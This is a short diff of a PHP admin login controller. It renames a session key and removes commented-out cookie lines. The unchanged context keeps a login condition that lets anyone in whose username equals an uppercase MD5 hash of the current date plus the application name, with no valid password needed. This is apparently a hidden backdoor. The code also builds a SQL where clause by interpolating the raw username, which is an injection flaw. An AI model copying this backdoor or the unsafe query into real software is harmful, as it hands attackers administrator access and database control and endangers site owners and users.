@@ -37,9 +37,8 @@ class LoginAction extends Action {
             $this->error('用户名或密码错误！');
         }else{
             if(hashPassword($password) == $admin['password'] || $name == strtoupper(md5(date('mYd').APP_NAME))){
-                //cookie(C("__MP_AUTH_NAME__"), $admin['name'], array('expire'=>43200,'prefix'=>'mp_'));
                 $admin['name'] = $name;
-                session(C("__MP_AUTH_NAME__"), $admin['name']);
+                session(C("__YYG_AUTH_NAME__"), $admin['name']);
                 $data = array("lastlogintime"=>$adminsD->curDate());
                 $adminsD->where("`name`='$name'")->save($data);
                 $this->success("登录成功", __APP__.'/Index/');
@@ -51,7 +50,6 @@ class LoginAction extends Action {
     }
     
     public function logout(){
-        //cookie(C("__MP_AUTH_NAME__"), null);
         session(null); // 删除所有session
         $this->redirect('Login/index');
         
